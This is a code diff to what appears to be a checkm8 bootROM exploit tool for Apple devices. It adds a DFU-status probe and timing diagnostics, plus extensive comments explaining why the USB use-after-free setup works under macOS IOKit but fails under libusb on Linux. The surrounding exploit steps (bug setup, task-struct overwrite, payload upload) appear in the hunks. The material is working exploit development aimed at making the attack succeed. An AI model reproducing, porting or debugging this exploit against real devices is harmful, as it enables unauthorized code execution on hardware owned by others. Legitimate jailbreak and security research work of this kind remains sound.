@@ -345,6 +345,107 @@ static int tracedTransfer(irecv_client_t client, const char* label,
                             data, wLength, timeout, NULL);
 }
 
+// ---------------------------------------------------------------------------
+// DFU state probe (DEBUG_DFU_STATUS)
+// ---------------------------------------------------------------------------
+//
+// DFU_GETSTATUS (0xA1, 3) returns the device's OWN view of the state machine:
+// bStatus, bwPollTimeout[3], bState, iString. It answers the one question the
+// transfer trace structurally cannot.
+//
+// Why that question exists: the bug setup reports "device consumed 0 bytes" on
+// a SUCCESSFUL macOS run and on a FAILING Linux run alike, but the two get
+// there by different mechanisms and the count cannot tell them apart. IOKit
+// cancels with USBDeviceAbortPipeZero(), which aborts a pipe whose SETUP the
+// controller has already put on the wire -- the device allocated a buffer and
+// then had its data stage abandoned, which is exactly the dangling-buffer
+// precondition checkm8 needs. libusb cancels with libusb_cancel_transfer() ->
+// USBDEVFS_DISCARDURB -> usb_unlink_urb, which, for a URB that has not reached
+// the controller yet, simply dequeues it and the SETUP never transmits at all.
+// Same reported 0 bytes; opposite device state.
+//
+// So: after the bug setup, macOS should be in dfuDNLOAD_IDLE or dfuDNBUSY
+// (holding a buffer), and if this hypothesis is right Linux will be in dfuIDLE
+// (never saw the request). That is a direct, decisive discriminator.
+//
+// !! THIS IS NOT PASSIVE. !!
+// DFU_GETSTATUS advances the DFU state machine -- dfuDNLOAD_SYNC becomes
+// dfuDNBUSY or dfuDNLOAD_IDLE by the act of asking. A run with this enabled is
+// NOT evidence about a run without it, and it may well break an exploit that
+// would otherwise have worked. It is a diagnostic to be compared across the
+// two platforms with the flag set on BOTH, never a knob to leave on.
+// Everything else here defaults to the macOS-confirmed behaviour; this one
+// deliberately changes it, which is why it is off unless asked for.
+
+static int dfuStatusEnabled(void) {
+    static int resolved = 0;
+    static int value = 0;
+
+    if (!resolved) {
+        value = getenv("DEBUG_DFU_STATUS") != NULL;
+        resolved = 1;
+    }
+    return value;
+}
+
+static const char* dfuStateName(unsigned char state) {
+    switch (state) {
+        case 0:  return "appIDLE";
+        case 1:  return "appDETACH";
+        case 2:  return "dfuIDLE";
+        case 3:  return "dfuDNLOAD_SYNC";
+        case 4:  return "dfuDNBUSY";
+        case 5:  return "dfuDNLOAD_IDLE";
+        case 6:  return "dfuMANIFEST_SYNC";
+        case 7:  return "dfuMANIFEST";
+        case 8:  return "dfuMANIFEST_WAIT_RESET";
+        case 9:  return "dfuUPLOAD_IDLE";
+        case 10: return "dfuERROR";
+        default: return "?";
+    }
+}
+
+static const char* dfuStatusName(unsigned char status) {
+    switch (status) {
+        case 0:  return "OK";
+        case 1:  return "errTARGET";
+        case 2:  return "errFILE";
+        case 3:  return "errWRITE";
+        case 4:  return "errERASE";
+        case 5:  return "errCHECK_ERASED";
+        case 6:  return "errPROG";
+        case 7:  return "errVERIFY";
+        case 8:  return "errADDRESS";
+        case 9:  return "errNOTDONE";
+        case 10: return "errFIRMWARE";
+        case 11: return "errVENDOR";
+        case 12: return "errUSBR";
+        case 13: return "errPOR";
+        case 14: return "errUNKNOWN";
+        case 15: return "errSTALLEDPKT";
+        default: return "?";
+    }
+}
+
+// Deliberately NOT routed through tracedTransfer(): this request is an
+// intrusion into the sequence rather than part of it, and mixing it into the
+// trace table would make a perturbed run look like a normal one.
+static void probeDfuStatus(irecv_client_t client, const char* where) {
+    if (!dfuStatusEnabled()) return;
+
+    unsigned char st[6];
+    memset(st, 0, sizeof(st));
+    int ret = irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, st, sizeof(st), 1000);
+    if (ret != (int)sizeof(st)) {
+        printf("dfu-status @ %-22s -> request failed (ret %d)\n", where, ret);
+        return;
+    }
+    unsigned pollTimeout = (unsigned)st[1] | ((unsigned)st[2] << 8) | ((unsigned)st[3] << 16);
+    printf("dfu-status @ %-22s -> bStatus %u (%s), bState %u (%s), bwPollTimeout %u ms\n",
+           where, st[0], dfuStatusName(st[0]), st[4], dfuStateName(st[4]), pollTimeout);
+    fflush(stdout);
+}
+
 // Called on every exit path out of runCheckm8()/runSHAtter(), including the
 // failing ones -- a failed run is the interesting one here.
 static void traceFlush(void) {
@@ -794,8 +895,17 @@ static int runCheckm8Inner(uint64_t ecid) {
 
     puts("Preparing for overwrite");
 
+    probeDfuStatus(client, "before bug setup");
+
     unsigned delayUs = cancelDelayUs();
+    // Timed separately from the trace table: this goes through
+    // irecv_async_usb_control_transfer_with_cancel(), not the traced control
+    // path, and its duration is the one hint available as to whether the SETUP
+    // reached the wire before the cancel landed. A call that returns in barely
+    // more than delayUs never round-tripped anything.
+    unsigned long bugSetupStarted = nowUs();
     int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
+    unsigned long bugSetupElapsed = nowUs() - bugSetupStarted;
     // The one number that decides whether this stage did anything, and it was
     // previously computed and thrown away. Anything outside 0 < sent <=
     // overwrite_offset means the following overwrite lands somewhere the
@@ -803,8 +913,16 @@ static int runCheckm8Inner(uint64_t ecid) {
     // be useless in principle, but the macOS path this was ported from is
     // confirmed working and has never been measured, so refusing to continue
     // on 0 could break the one configuration known to succeed.
-    printf("bug setup: cancel delay %u us -> device consumed %d of %d bytes (want 0 < n <= %d)\n",
-           delayUs, sent, 0x800, config.overwrite_offset);
+    // NOTE on "want 0 < n <= %d": that range is NOT the working configuration.
+    // A confirmed-working macOS run consumes 0, outside it; Linux consumes 64
+    // at the 100us default, inside it, and fails. Kept printed because the
+    // number itself is useful, but do not read the range as a target -- see
+    // docs/HISTORY.md, "The overwrite was never the problem".
+    printf("bug setup: cancel delay %u us -> device consumed %d of %d bytes "
+           "(range 0 < n <= %d is NOT the success condition), call took %lu us\n",
+           delayUs, sent, 0x800, config.overwrite_offset, bugSetupElapsed);
+
+    probeDfuStatus(client, "after bug setup");
     if (sent < 0) {
         printf("Failed to send bug setup.\n");
         free(config.payload);
@@ -860,6 +978,8 @@ static int runCheckm8Inner(uint64_t ecid) {
         return 0;
     }
 
+    probeDfuStatus(client, "before overwrite");
+
     puts("Overwriting task struct");
 
     size_t overwrite_buf_len = (size_t)config.overwrite_offset + config.overwrite_len;
@@ -899,6 +1019,8 @@ static int runCheckm8Inner(uint64_t ecid) {
            isPipeStall(overwriteRet) ? " (stalled -- device rejected it outright)"
                                      : (isTransferTimeout(overwriteRet) ? " (timed out mid-transfer)" : ""));
     free(overwrite_buf);
+
+    probeDfuStatus(client, "after overwrite");
 
     puts("Uploading payload");
 
